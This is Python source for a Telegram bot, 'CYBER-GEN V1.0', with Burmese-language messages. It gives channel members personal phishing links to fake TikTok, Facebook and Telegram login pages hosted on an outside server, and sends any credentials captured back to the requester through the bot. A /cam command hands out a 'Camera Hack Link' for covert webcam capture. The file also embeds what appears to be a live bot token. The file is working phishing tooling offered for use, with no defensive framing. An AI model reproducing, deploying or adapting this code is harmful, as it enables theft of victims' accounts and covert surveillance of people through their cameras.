import telebot
import requests

TOKEN = "8560939710:AAHF8NUj9JeewEx5jQ1XStJpKzFaV3PgknE"

bot = telebot.TeleBot(TOKEN)

Template = [
    "TikTok",
    "Facebook",
    "Telegram",
    ]
    
SERVER_URL = "https://osizjihxuhwbajj.onrender.com"

CHANNEL_ID = "@DOMGPT0"

def check_join(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
        else:
            return False
    except:
        return False

@bot.message_handler(commands=["start"])
def startt(message):
    if check_join(message.from_user.id):
        idd = message.chat.id
        welcome_text = (
            "🔥 **WELCOME TO CYBER-GEN V1.0** 🔥\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "ဒီ Bot ကနေတစ်ဆင့် သင့်ရဲ့ Target များအတွက် \n"
            "Phishing Link များကို အခမဲ့ ထုတ်ယူနိုင်ပါတယ်။\n\n"
            "🚀 **ရရှိနိုင်သော ဝန်ဆောင်မှုများ:**\n"
            "• TikTok Login Page\n"
            "• Facebook Secure Login\n"
            "• Telegram Web Login\n"
            "💡 **အသုံးပြုနည်း:**\n"
            "အောက်ပါ Command များကို နှိပ်ပြီး Link ထုတ်ယူပါ -\n"
            "👉 /TikTok , /Facebook , /Telegram\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ *သတိပေးချက်: ရရှိလာသော Data များကို ဤ Bot မှတစ်ဆင့် သင့်ဆီသို့ တိုက်ရိုက် ပေးပို့သွားမည်ဖြစ်ပါသည်။*"
            )
        bot.reply_to(message, welcome_text, parse_mode="Markdown")
        
    else:
        text = f"မင်းက ငါ့ Channel ကို မ join ဘဲ Bot လာသုံးတာလား? သွား join လိုက်စမ်း ခွေးသား! 😤\n\nChannel Link: `{CHANNEL_ID}`"
        bot.reply_to(message, text ,parse_mode="Markdown")
        return
            
@bot.message_handler(commands=Template)
def moo(message):
    if not check_join(message.from_user.id):
        bot.reply_to(message, f"❌ Channel အရင် Join ပါဦး!\n\n`{CHANNEL_ID}`")
        return
    idc = message.chat.id
    typesp = message.text.replace('/','').lower()
                
    personal_link = f"{SERVER_URL}/login/{typesp}?id={idc}"
                
    bot.send_chat_action(idc, 'typing')
                
    bot.reply_to(message, f"Your command : `{message.text}`\n\nLink : `{personal_link}`\n\nData will recieves to you in this bot", parse_mode="Markdown")
                
@bot.message_handler(commands=['cam'])
def send_cam_link(message):
    if not check_join(message.from_user.id):
        bot.reply_to(message, f"❌ Channel အရင် Join ပါဦး!\n\n`{CHANNEL_ID}`")
        return
            
    idc = message.chat.id
    cam_link = f"{SERVER_URL}/login/camera?id={idc}"
                
    bot.reply_to(message, f"📸 **Camera Hack Link:**\n\n`{cam_link}`", parse_mode="Markdown")

                
print("[+] Bot Logic Loaded...")
bot.infinity_polling()
